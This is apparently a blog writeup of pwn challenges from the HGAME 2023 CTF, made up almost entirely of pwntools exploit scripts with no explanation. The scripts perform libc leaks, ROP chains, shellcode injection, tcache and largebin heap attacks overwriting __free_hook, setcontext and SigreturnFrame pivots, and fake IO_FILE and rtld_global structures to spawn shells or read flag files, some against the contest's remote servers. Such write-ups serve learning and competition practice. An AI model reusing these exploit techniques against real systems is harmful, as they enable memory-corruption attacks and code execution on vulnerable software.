---
title: 2023 hgame pwn Writeup
date: 2023-01-31 19:54:59 +0800
categories:
  - ctf比赛
tags:
  - pwn
  - ctf
permalink: /posts/id=53/
pin: false
published:
---

# week1

## choose_the_seat

```python
# _*_ coding:utf-8 _*_
from pwn import *
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-h']

p = remote("week-1.hgame.lwsec.cn","30086")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
# p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------
# dbg()
vuln = 0x4011D6
sla("choose one.","-6")
sla("please input your name",p64(vuln))
sleep(0.1)
sla("ByeHere is the seat from 0 to 9, please choose one.","-8")
sla("please input your name",'')
libc_base = l64()-0x08ba0a
lg('libc_base')

one = libc_base+0xe3b01
sla("ByeHere is the seat from 0 to 9, please choose one.","-6")
sla("please input your name",p64(one))
# 0x08ba0a

ia()

'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''
```

## orw

```python
# _*_ coding:utf-8 _*_
from pwn import *
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-h']

p = remote("week-1.hgame.lwsec.cn","31142")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
# p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

pop_rdi = 0x0000000000401393
pop_rsi = 0x0000000000401391
bss = 0x404200
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read = 0x4012CF
vuln = 0x4012C0
ret = 0x000000000040101a

ru("before you try to solve this task.")
pay = 'a'*0x100+p64(bss)+p64(read)
s(pay)
sleep(0.1)
pay = 'a'*0x100+p64(bss+0x100)+p64(read)
s(pay)
sleep(0.1)
pay = p64(0)+p64(pop_rdi)+p64(puts_got)+p64(ret)+p64(puts_plt)+p64(vuln)
s(pay)

libc_base = l64()-0x084420
lg('libc_base')

pop_rdx = libc_base + 0x0000000000142c92
Open = libc_base+libc.sym['open']
Read = libc_base+libc.sym['read']
Write = libc_base+libc.sym['write']
sleep(0.1)
pay = 'a'*0x100+p64(bss)+p64(read)
sl(pay)
sleep(0.1)
pay = 'a'*0x100+p64(bss+0x100)+p64(read)
sl(pay)
# dbg()
sleep(0.1)
flag = 0x404200
pay = 'flag'.ljust(8,'\x00')+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)*2+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404200)+p64(0)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
sl(pay)


ia()
```



## simple_shellcode

```python
# _*_ coding:utf-8 _*_
from pwn import *
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-h']

p = remote("week-1.hgame.lwsec.cn","30490")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
# p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

# read = "\x31\xc0\x0f\x05"

orw_payload = shellcraft.open('/flag')
orw_payload += shellcraft.read(3,'rsp',0x100)
orw_payload += shellcraft.write(1,'rsp',0x100)

syscall='\x0f\x05'

pay = "\x48\x89\xd6"+"\x48\x31\xff"+'\x0f\x05'
sla("Please input your shellcode:",pay)
sl('\x00'*8+asm(orw_payload))

ia()
```



# week3

## safe_note

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

for i in range(8):
    add(i, 0x90)# 0-7

add(8, 0x20)

for i in range(8):
    dele(i)

show(0)
key = u64(p.recv(5).ljust(8,'\x00'))
lg('key')
heap_base = key<<12
lg('heap_base')

edit(7, 'a')# main_arena低地址为\x00
show(7)
libc_base = l64() - 0x1e3c61
lg('libc_base')
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
edit(7, '\x00')

#--------------------改fd----------------------
add(9, 0x20)
add(10, 0x20)# 放binsh
edit(10, "/bin/sh\x00")

dele(8)
dele(9)

edit(9, p64(free_hook ^ key))
add(11, 0x20)
add(12, 0x20)
edit(12, p64(system_addr))

dele(10)
ia()
```

## long_note

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

add(0, 0x528)
add(1, 0x600)
add(2, 0x518)

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1e4030
main_arena = libc_base+0x1e4030
lg('libc_base')
mp_ = libc_base + 0x1e3280
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
lg('mp_')

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
pay = p64(main_arena)*2 + p64(0) + p64(mp_+0x50-0x20)
edit(0,pay)
add(3,0x900)

dele(1)
edit(0,"a" * 0xe8 + p64(free_hook))

add(1, 0x600)
edit(1, p64(system_addr))
edit(0, "/bin/sh\x00")
dele(0)

ia()
```

## next_context

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("week-4.hgame.lwsec.cn","31435")
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

add(0, 0x528)
add(1, 0x600)
add(2, 0x518)

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1e4030
main_arena = libc_base+0x1e4030
lg('libc_base')
mp_ = libc_base + 0x1e3280
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
lg('mp_')

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
pay = p64(main_arena)*2 + p64(0) + p64(mp_+0x50-0x20)
edit(0,pay)
add(3,0x900)
# -------------------------------------------------------------------

gadget = libc_base + 0x000000000014b760
mprotect = libc_base + libc.sym['mprotect']
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
setcontext = libc_base+libc.sym['setcontext']+61

frame = SigreturnFrame()# 这个框架的地址要赋给rdx
frame.rsp = libc_base + libc.sym['__free_hook']+0x10# 2
frame.rdi = free_hook_base
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc_base + libc.sym['mprotect']# 1


dele(1)# 0x600
edit(0,"a"*0xe8 + p64(free_hook-0x150))
add(1,0x600)

frame_addr = libc_base+libc.sym["__free_hook"]-0x150+0x10
pay = p64(0)+p64(frame_addr)+p64(0)*4+p64(setcontext)+str(frame)[0x28:]# 0x28正好补齐即从+0x10开始
pay = pay.ljust(0x150,'\x00')
pay += p64(gadget)
pay += p64(0)+p64(libc_base+libc.sym["__free_hook"]+0x18)#2
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base))

edit(1, pay)

dele(1)

# orw
sc = asm(shellcraft.cat('/flag'))
sc += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base+0x100))
s(sc)

ia()
```



# week4

## without_hook

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("week-4.hgame.lwsec.cn","31435")
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

add(0,0x520)# big
add(1,0x508)
add(2,0x508)# small IO_FILE

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1f70f0
main_arena = libc_base + 0x1f70f0
lg('libc_base')
rtld_global = libc_base+0x23d020
lg('rtld_global')
setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
lg('ret')
pop_rdi = libc_base + 0x0000000000023ba5

pop_rsi = libc_base + 0x00000000000251fe
pop_rdx = libc_base + 0x000000000008bbb9 # pop_2
Open=libc_base+libc.sym['open']
Read=libc_base+libc.sym['read']
Write=libc_base+libc.sym['write']
# bin_sh = libc_base + libc.search('/bin/sh\x00').next()
# system =  libc_base + libc.sym['system']
# lg("system")

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
edit(0,p64(main_arena)*2 + p64(0) + p64(rtld_global-0x20))
add(3,0x900)


fake_heap_addr = heap_base+0xcd0 # rtld_global填的堆地址
flag_addr = fake_heap_addr+0xb8 # 相对偏移
next_load = libc_base + 0x23e8b0 # 第一个load+0x18的值

orw =  p64(pop_rsi)+p64(0)+p64(Open)
orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base+0x1b00)+p64(pop_rdx)+p64(0x50)+p64(0)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)+"/flag".ljust(8,'\x00')

payload = p64(0) + p64(next_load) + p64(0) + p64(fake_heap_addr)
payload += p64(setcontext) + p64(ret) # rdx_addr/call rdx

payload += p64(flag_addr) # rsp
payload += orw # 0x78
payload = payload.ljust(0xc8,'\x00')
# payload += p64(bin_sh)# rsp
# payload += p64(0)
# payload += p64(system)
# payload += '\x00'*0x80

payload += p64(fake_heap_addr + 0x28 + 0x18) # rdx+0xa0
payload += p64(pop_rdi) # rdx+0xa8
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x334 - 0x10,'\x00')# 2.36
payload += '\x10'
# payload = payload.ljust(0x31C - 0x10,'\x00')
# payload += '\x08

edit(2,payload)
edit(1,'a'*0x500+p64(fake_heap_addr + 0x20))

sla(">",5)
ia()
```

## **4nswer's gift**

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote("week-4.hgame.lwsec.cn","32505")
# p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

ru("0x")
libc_base = int(p.recv(12),16)-0x1f7660
lg('libc_base')
setcontext = libc_base + libc.sym['setcontext'] + 61
IO_wfile_jumps = libc_base + 0x1f30a0
one_gadget = libc_base + 0x105fb7

ru("How many things do you think is appropriate to put into the gift?")
sl(str(0x30000))
ru("What do you think is appropriate to put into the gitf?")



heap_base = libc_base-0x034000
fake_io_addr = heap_base+0x10
next_chain = 0

fake_IO_FILE =  p64(0xfbad1800) + p64(0)
fake_IO_FILE +=  p64(0)*2
fake_IO_FILE +=  p64(0)+p64(0xffffffffffffffff)
fake_IO_FILE +=  p64(0)+p64(0)
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) #_IO_backup_base=setcontext_rdx
fake_IO_FILE += p64(one_gadget) #_IO_save_end=call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) 
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x30)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

sl(fake_IO_FILE)


ia()
```



